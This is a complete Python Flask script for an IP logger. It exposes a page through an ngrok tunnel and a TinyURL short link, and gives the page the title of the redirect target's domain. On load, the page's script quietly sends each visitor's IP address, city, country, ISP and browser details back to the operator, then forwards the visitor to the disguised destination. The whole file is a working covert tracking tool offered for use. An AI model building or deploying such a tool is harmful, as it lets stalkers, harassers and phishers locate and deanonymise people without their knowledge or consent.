import logging
logging.getLogger('werkzeug').disabled = True
import flask.cli
flask.cli.show_server_banner = lambda *args: None
from flask import Flask, request
from flask_cors import CORS
import requests
from pyngrok import ngrok
import sys
import argparse

parser = argparse.ArgumentParser(formatter_class=lambda prog: argparse.HelpFormatter(prog,max_help_position=200))
parser.add_argument("-t", "--token", help="Ngrok authtoken", required=True)
parser.add_argument("-r", "--redirect", help="Url to redirect to after ip log", required=True)
if len(sys.argv)==1:
    parser.print_help(sys.stderr)
    sys.exit(1)
args = parser.parse_args()

ngrok_token, redirect_url = args.token, args.redirect

PORT = 5000

logger_html = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>|TITLE|</title>
</head>
<body>
    <script>
        const useragent = navigator.userAgent;
        fetch("https://ipapi.co/json/")
        .then(response => response.json())
        .then(ipdata => {
            fetch("|URL|/log", {
                method: "POST",
                headers: {
                    "Content-Type": "application/json"
                },
                body: JSON.stringify({
                    ipdata: ipdata,
                    useragent: useragent
                })
            })
            .then(response => response.json())
            .then(data => {
            	location.replace("|REDIRECT|")
            });
        });
    </script>
</body>
</html>
"""

ngrok.set_auth_token(ngrok_token)
ngrok_tunnel = ngrok.connect(PORT)
url = ngrok_tunnel.public_url
res = requests.get(f"https://tinyurl.com/api-create.php?url={url}")
print(f"[!] IP Logger is running on: {res.text}")
try:
	app = Flask(__name__)
	CORS(app)

	@app.route("/")
	def index():
		return logger_html.replace("|URL|", url).replace("|REDIRECT|", redirect_url).replace("|TITLE|", redirect_url.replace("https://", ""))

	@app.route("/log", methods=["POST"])
	def log():
		data = request.get_json()
		print(f"[+] Ip: {data['ipdata']['ip']}, City: {data['ipdata']['city']}, Country: {data['ipdata']['country_name']}, Provider: {data['ipdata']['org']}, UserAgent: {data['useragent']}")
		return {"error": False, "message": "done"}

	app.run(port=PORT)
finally:
	print("[!] IP Logger stopped.")